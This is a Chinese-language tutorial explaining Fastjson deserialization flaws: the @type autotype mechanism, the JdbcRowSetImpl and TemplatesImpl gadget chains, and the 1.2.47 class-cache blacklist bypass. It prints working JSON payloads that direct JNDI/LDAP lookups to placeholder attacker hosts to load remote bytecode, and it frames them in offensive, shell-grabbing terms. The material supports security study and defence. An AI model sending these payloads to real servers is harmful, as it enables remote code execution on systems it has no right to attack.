---
date: 2026-10-15
title: "Fastjson反序列化：autotype机制与各版本绕过链"
---
# ⚡ Fastjson 反序列化底层 `@type` 机制与 1.2.24/1.2.47 缓存绕过神级攻防

> **背景与影响**：Fastjson 是阿里巴巴开源的高性能 Java JSON 解析库。因其广泛应用于国内一线大厂与各类政企 Java Web 架构中，其历史反序列化漏洞成为了近年来攻防演练（HVV）与安全研究中曝光度最高、威力最大的武器之一。

---

## 0. 基础前置认知与小白扫盲：Fastjson 为什么会成为“漏洞之王”？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 什么是 Fastjson？为什么要用 `@type`？
* **Fastjson 是干什么的？** 它是阿里开源的超高性能 Java JSON 解析库，能快速把 JSON 字符串转成 Java 对象（反序列化），反之亦然。
* **`@type` 的初衷**：
  * 在面向对象编程中，一个接口可能有多个不同的实现类（多态）。
  * Fastjson 为了让开发者在反序列化时能准确还原具体的子类类型，特意设计了一个扩展字段——`@type`。
  * 只要 JSON 字符串里写了 `@type: "com.example.Student"`，Fastjson 就会自动利用反射，在内存里实例化这个 `Student` 类，并**自动调用其对应的 Setter 方法把属性值填进去**！

---

### 2. 致命隐患：谁让你把门钥匙交给外人的？
* **失控的多态调用**：
  * 如果 Fastjson 对传入的 `@type` 类名没有任何校验和限制，攻击者就能传入任意一个系统自带的危险类（Gadget 链，比如著名的 `com.sun.rowset.JdbcRowSetImpl`）。
  * 攻击者在 JSON 里指定这个类，并传入恶意的 LDAP/RMI 远程地址：
    ```json
    {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://attacker.com/Exploit",
      "autoCommit": true
    }
    ```
  * Fastjson 在反序列化填入属性时，会自动调用 `setAutoCommit(true)`。
  * `setAutoCommit()` 内部会触发 `connect()`，进而直接向攻击者的 LDAP 服务器发起 JNDI 远程查询，把黑客编写的恶意字节码加载进 JVM 内存，瞬间造成**前台无凭证任意命令执行（RCE）**！

---


## 一、核心漏洞根源：`@type` 多态特性与 Setter/Getter 自动回调

### 1. 为什么设计 `@type`？
在面向对象编程中，一个接口或抽象类可以拥有多个不同子类（多态）。为了在反序列化 JSON 文本时准确还原具体的 Java 子类，Fastjson 设计了 `@type` 键：
```json
{"@type": "com.example.Student", "name": "Alice"}
```
当 Fastjson 看到 `@type` 时，会通过 Java 反射加载并实例化该类。

### 2. Fastjson 的隐式方法触发陷阱
Fastjson 在还原对象属性时，会根据 JSON 字段名自动寻找并调用对应类的底层方法：
* **`JSON.parse(str)`**：
  * 会自动调用目标类中所有符合命名规范的 **Setter 方法**（如属性名为 `autoCommit`，则自动调用 `setAutoCommit()`）。
* **`JSON.parseObject(str)`**：
  * **杀伤力更大！** 它不仅调用所有的 Setter 方法，还会把该类所有返回类型为 `Map`、`Collection`、`AtomicBoolean` 等对象的 **Getter 方法也全部无条件执行一遍！**

---

## 二、经典两大武器载荷（Gadgets）底层参数逐字剖析

---

### 载荷一：`JdbcRowSetImpl`（基于 JNDI 注入远程加载，最常用）

#### 🔍 注入 Payload：
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker-ip:1389/Exploit",
    "autoCommit": true
}
```

#### 🔍 参数与方法调用链深度剖析表：
| JSON 字段 | 触发调用的底层 Java 方法 | 深入代码执行流与安全后果 |
| :--- | :--- | :--- |
| `"@type": "com.sun.rowset.JdbcRowSetImpl"` | 反射加载 `JdbcRowSetImpl.class` 并实例化。 | JDK 自带的基础组件，天然存在于绝大多数运行环境中，无需任何第三方依赖！ |
| `"dataSourceName": "ldap://..."` | `setDataSourceName(String name)` | 将恶意 JNDI 远程服务器地址赋值给内部私有成员变量。 |
| `"autoCommit": true` | **💥 引爆触发点：`setAutoCommit(boolean autoCommit)`** | **关键底层代码**：<br>`if (this.conn == null) { this.connect(); }`<br>在 `connect()` 内部调用了：<br>`InitialContext ctx = new InitialContext();`<br>`ctx.lookup(this.getDataSourceName());`<br>强制向攻击者架设的 LDAP/RMI 服务发起 JNDI 查找，远程下载并执行恶意 `.class` 字节码！ |

---

### 载荷二：`TemplatesImpl`（无出网限制，纯本地字节码加载）

当目标服务器处于严格隔离的内网、**完全禁止向外发起 LDAP/RMI 网络请求**时，`JdbcRowSetImpl` 会失效。此时必须使用 `TemplatesImpl`！

#### 🔍 注入 Payload 结构：
```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["yv66vgAAADQA...【恶意编译Class的Base64字节码】..."],
    "_name": "a",
    "_tfactory": {},
    "_outputProperties": {}
}
```

#### 🔍 参数与方法调用链剖析：
* **`_bytecodes`**：攻击者将编写的恶意 Java 类（必须继承 `AbstractTranslet` 并在静态代码块 `static {}` 中执行 `Runtime.getRuntime().exec()`）直接编译为二进制，Base64 编码后塞入数组。
* **`_outputProperties`**：**触发点**。Fastjson 会自动调用 `getOutputProperties()`，进而进入 `newTransformer()` $\rightarrow$ `defineTransletClasses()`，**直接在目标 JVM 内存中动态加载并实例化恶意字节码！不依赖任何外部出网连接！**

---

## 三、版本攻防演进与 1.2.47“缓存机制双剑合璧”神级绕过

### 1. Fastjson 1.2.24（裸奔时代）
* 无任何限制，直接传入上述 `JdbcRowSetImpl` 即可瞬间拿 Shell。

### 2. Fastjson 1.2.25（引入 AutoType 与黑名单机制）
* 官方引入了 `ParserConfig.checkAutoType()` 方法；
* 增加了 `autoTypeSupport` 开关（默认关闭 `false`）；
* 建立了庞大的黑名单列表（把 `com.sun.rowset.JdbcRowSetImpl` 彻底拉黑）。

---

### 3. Fastjson 1.2.47：利用类加载缓存机制的绝妙绕过（通杀默认配置）

在 `autoTypeSupport = false`（默认最安全配置）下，安全研究员挖掘出了一个绝妙的底层逻辑漏洞——**TypeUtils 全局类缓存绕过！**

#### 🔍 漏洞底层成因：
在 `ParserConfig.checkAutoType()` 源码中，执行流程存在一个优先级顺序：
```java
// 1. 核心致命点：先查全局缓存 mappings！
Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
if (clazz != null) {
    return clazz; // 💥 如果类已经在缓存中，直接返回，跳过后续所有黑名单和 AutoType 校验！
}

// 2. 只有缓存没有命中时，才进行黑名单与 autoTypeSupport 拦截判断
if (!autoTypeSupport) {
    if (Arrays.binarySearch(this.denyHashCodes, h1) >= 0) {
        throw new JSONException("autoType is not support ... ");
    }
}
```

> [!IMPORTANT]
> **破防思路**：
> 只要我们能想办法在第一步**把黑名单中的 `JdbcRowSetImpl` 提前注入进全局类缓存 `mappings` 中**，后续再次调用它时，就会因为命中缓存而直接无视黑名单放行！
>
> **谁能往缓存里加东西？** $\rightarrow$ **`java.lang.Class` 类！**
> 当 Fastjson 反序列化 `java.lang.Class` 时，其对应的反序列化器 `MiscCodec` 会调用 `TypeUtils.loadClass()`，而 `loadClass()` 内部默认会**把加载成功的类自动存入全局类缓存 `mappings` 中！**

---

### 4. 1.2.47 完整利用 Payload 结构：
```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://attacker.com:1389/Exploit",
        "autoCommit": true
    }
}
```

#### 🔍 两段式注入时序全景透视：
1. **第一阶段（对象 `a` 入场，暗中下毒）**：
   * Fastjson 解析对象 `a`，看到 `@type: "java.lang.Class"`（合法合规类，不在黑名单中）；
   * 进入 `MiscCodec` 解析器，提取 `val` 参数；
   * 调用 `TypeUtils.loadClass("com.sun.rowset.JdbcRowSetImpl")`，成功加载类并**神不知鬼不觉地将其缓存进全局 `mappings` 哈希表**！
2. **第二阶段（对象 `b` 入场，触发收割）**：
   * Fastjson 紧接着解析对象 `b`，看到 `@type: "com.sun.rowset.JdbcRowSetImpl"`；
   * 进入 `checkAutoType()`，首先查询全局 `mappings` 缓存；
   * **缓存命中！** 校验逻辑直接认为这是系统已授信的安全类，**立刻跳过了黑名单检测直接放行！**
   * 紧接着执行 `setAutoCommit(true)` 触发 JNDI 注入，全版本通杀 RCE！

---

## 🔗 相关双向链接
- 上级模块：[[07-反序列化漏洞深度专精]]
- 依赖基础：[[CommonsCollections 1与6链深入断点剖析]]
- 企业实战：[[Shiro反序列化：CBC与GCM加密与Key利用全流程]]
- 知识地图：[[00-Web安全与CTF知识地图总览]]
